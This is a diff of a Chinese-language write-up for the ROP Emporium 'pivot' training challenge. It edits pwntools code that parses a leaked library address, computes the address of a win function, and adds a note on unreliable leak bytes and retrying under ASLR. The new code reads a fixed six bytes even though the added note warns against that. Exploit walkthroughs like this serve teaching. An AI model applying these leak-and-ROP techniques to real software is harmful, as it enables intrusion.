@@ -113,12 +113,16 @@ chain += p64(MAIN)                           # 重来一轮
 leak 解析（`puts` 遇到 `\x00` 截断，libpivot 在高地址，通常只有 6 字节有效）：
 
 ```python
-io.recvuntil(b"into libpivot\n")
-raw = io.recvline().strip(b"\n")
-leak = u64(raw.ljust(8, b"\x00"))
+io.recvuntil(b"into libpivot\n")   # foothold_function 的打印
+leak = u64(io.recvn(6).ljust(8, b"\x00"))   # 紧跟着是 puts 输出的 6 字节原始地址
 libpivot = leak - 0x96a
 ret2win  = libpivot + 0xa81
 ```
+
+> **坑**：这 6 字节里可能正好有 `0x00`（`puts` 在此截断，只剩 2~5 字节）或 `0x0a`
+> （`recvline()` 会截断）；所以既不能用 `recvline()`，也不能假设固定长度。
+> 本仓库的做法是读到下一个 banner `pivot by ROP Emporium` 为止，
+> 并检查 `libpivot & 0xFFF == 0`；不是页对齐就 `close()` 重开一局（ASLR 会变，最多 5 次）。
 
 ---
 
